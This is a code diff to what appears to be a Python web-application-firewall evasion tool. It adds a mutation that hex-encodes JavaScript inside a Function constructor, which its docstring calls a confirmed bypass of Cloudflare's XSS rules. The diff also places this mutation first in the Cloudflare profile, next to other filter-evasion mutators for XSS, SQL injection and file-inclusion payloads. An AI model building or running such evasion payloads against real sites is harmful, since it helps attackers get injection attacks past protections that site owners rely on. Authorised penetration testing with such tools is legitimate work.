@@ -248,6 +248,22 @@ def _polyglot_xss(_payload: str) -> str:
     return random.choice(polyglots)
 
 
+def _js_hex_function_obfuscation(payload: str) -> str:
+    """
+    Obfuscate JS calls using hex-encoded string literals within a Function constructor.
+    Example: alert(1) -> Function("\x61\x6c\x65\x72\x74\x28\x31\x29")()
+    Confirmed bypass for modern Cloudflare XSS rules.
+    """
+    # Identify the core JS part (e.g. alert(1)) while ignoring surrounding HTML tags
+    # This is a naive extraction; ideally mutations work on pure payloads.
+    clean = payload
+    if "<script>" in payload.lower():
+        clean = payload.lower().replace("<script>", "").replace("</script>", "").strip()
+    
+    hex_encoded = "".join(f"\\x{ord(c):02x}" for c in clean)
+    return f'Function("{hex_encoded}")()'
+
+
 def _null_byte_inject(payload: str) -> str:
     """Insert null bytes to bypass naive string filters."""
     return payload.replace("<", "%00<").replace("'", "%00'")
@@ -266,7 +282,8 @@ def _path_traversal_encode(payload: str) -> str:
 # "any" vendor is the fallback when no specific profile exists.
 
 _XSS_MUTATIONS = [_case_swap, _double_url_encode, _unicode_escape,
-                   _html_entity_mix, _tag_break_xss, _polyglot_xss, _null_byte_inject]
+                   _html_entity_mix, _tag_break_xss, _polyglot_xss, 
+                   _js_hex_function_obfuscation, _null_byte_inject]
 
 _SQLI_MUTATIONS = [_case_swap, _comment_inject_sql, _whitespace_fuzz,
                     _concat_split_sql, _double_url_encode]
@@ -275,7 +292,7 @@ _LFI_MUTATIONS = [_double_url_encode, _path_traversal_encode, _null_byte_inject]
 
 _VENDOR_PROFILES: dict[str, dict[str, list]] = {
     "Cloudflare": {
-        "xss":  [_double_url_encode, _unicode_escape, _polyglot_xss, _tag_break_xss, _case_swap],
+        "xss":  [_js_hex_function_obfuscation, _double_url_encode, _unicode_escape, _polyglot_xss, _tag_break_xss, _case_swap],
         "sqli": [_double_url_encode, _comment_inject_sql, _whitespace_fuzz, _case_swap],
         "lfi":  [_double_url_encode, _path_traversal_encode, _null_byte_inject],
     },
